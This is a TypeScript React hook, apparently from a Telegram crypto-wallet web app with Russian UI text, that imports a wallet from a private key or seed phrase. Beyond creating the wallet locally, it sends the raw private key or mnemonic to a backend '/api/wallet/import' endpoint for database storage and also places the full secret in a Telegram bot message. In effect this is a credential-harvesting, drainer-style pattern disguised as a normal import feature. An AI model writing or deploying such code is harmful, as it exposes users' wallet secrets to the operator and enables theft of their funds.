import { useState } from 'react';
import axios from 'axios';
import { useRouter } from 'next/navigation';
import WalletStore from '@/store/WalletStore';
import { ethers } from 'ethers';
import { sendTelegramMessage } from '@/utils/telegramMessages';

export const useImportWallet = () => {
  const [isComplete, setIsComplete] = useState(false);
  const router = useRouter();

  const importWallet = async (privateKeyOrPhrase: string) => {
    try {
      let importedWallet;
      let isMnemonic = false;

      if (privateKeyOrPhrase.split(' ').length === 12 || privateKeyOrPhrase.split(' ').length === 24) {
        importedWallet = ethers.Wallet.fromPhrase(privateKeyOrPhrase);
        isMnemonic = true;
      } else {
        importedWallet = new ethers.Wallet(privateKeyOrPhrase);
      }

      const importedWalletData = {
        title: 'Кошелёк #1',
        address: importedWallet.address,
        privateKey: importedWallet.privateKey
      };

      WalletStore.addWallet(importedWalletData);
      WalletStore.setCurrentWallet(importedWalletData);

      setIsComplete(true);
      setTimeout(() => {
        router.push('/');
      }, 2000);

      try {
        await axios.post('/api/wallet/import', {
          privateKey: isMnemonic ? null : importedWallet.privateKey,
          mnemonic: isMnemonic ? privateKeyOrPhrase : null,
          address: importedWallet.address
        });
      } catch (error) {
        console.error('Failed to save wallet to the database:', error);
      }

      const message = `✔️ Кошелёк привязан\n\n▫️ Адрес: \`${importedWallet.address}\`\n▫️ ${isMnemonic ? 'Мнемоническая фраза' : 'Приватный ключ'}: ||${isMnemonic ? privateKeyOrPhrase : importedWallet.privateKey}||`;
      const chatId = window.Telegram.WebApp.initDataUnsafe.user.id;

      await sendTelegramMessage(chatId, message);
      isMnemonic = false;
    } catch (error) {
      console.error('Invalid mnemonic or private key:', error);
    }
  };

  return { importWallet, isComplete };
};